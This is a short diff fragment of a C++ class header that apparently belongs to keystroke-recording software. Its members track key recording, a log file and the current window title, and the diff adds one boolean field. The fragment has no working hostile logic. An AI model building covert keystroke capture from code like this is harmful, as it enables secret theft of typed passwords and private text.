@@ -33,6 +33,7 @@ private:
     std::wstring logsFileName;
     std::atomic<bool> recordingKeys = false;
     std::string tempWindow;
+    bool firstRegister = true;
     static std::string getCurrentWindow();
     static bool checkShift();
     static bool checkAltGr();
